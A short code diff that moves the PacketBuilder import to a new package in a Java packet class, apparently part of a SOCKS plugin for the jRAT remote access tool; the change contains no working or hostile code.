@@ -3,8 +3,8 @@ package se.jrat.plugin.socks.client;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 
-import jrat.api.PacketBuilder;
 import jrat.api.Client;
+import jrat.api.net.PacketBuilder;
 import se.jrat.plugins.socks.Global;
 
 public class Packet118Start extends PacketBuilder {
